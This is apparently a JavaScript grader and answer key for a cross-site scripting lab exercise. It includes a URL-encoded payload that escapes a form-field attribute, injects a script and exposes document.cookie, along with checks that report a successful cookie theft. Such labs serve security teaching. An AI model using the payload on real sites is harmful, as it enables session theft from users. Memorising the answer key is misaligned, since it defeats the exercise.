var solutionHTML = FSTR(function(){/*
<h4>Solution</h4>
<p>A correct URL looks like:</p>
<p><a href="/cross-site-scripting/form-field?qs=hello%22%3E%3Cscript%3Edocument.getElementById%28%27cookie%27%29.innerHTML%253Ddocument.cookie%253B%3C/script%3E%3Ca%20name%3D%22">/cross-site-scripting/form-field?qs=hello%22%3E%3Cscript%3Edocument.getElementById%28%27cookie%27%29.innerHTML%253Ddocument.cookie%253B%3C/script%3E%3Ca%20name%3D%22</a>
*/});

$(function() {
    var result = '';
    var cookie = document.getElementById('cookie').firstChild.nodeValue;
    var nextSib = document.getElementById('qs').nextSibling;
    var attributes = document.getElementById('qs').attributes;

    if(nextSib && nextSib.tagName == 'SCRIPT') {
        result = '<div class="answer panel"><strong>Surprise!</strong> '+
                'Your browser is blocking XSS here. Take a look at the page ' +
                'source and see what it\'s doing.</div>';
        $('#result').html(result);
        return;
    }

    for(var i=0; i<attributes.length; i++) {
        var attributeName = attributes[i].name.toLowerCase();
        var attributeValue = attributes[i].value;

        if(attributeName.indexOf('on') == 0 && attributeValue == '') {
            result = '<div class="answer panel"><strong>Surprise!</strong> '+
                'Your browser is blocking XSS here. Take a look at the page ' +
                'source and see what it\'s doing.</div>';
            $('#result').html(result);
            return;
        }
    }

    if (cookie.search('monster') > -1) {
        result = '<div class="answer panel"><strong>Success!</strong> '+
            'You have managed to steal cookies from our user.</div>';
    } else {
        result = '<p>This page has not yet been hacked.</p>';
    }

    $('#result').html(result);
});
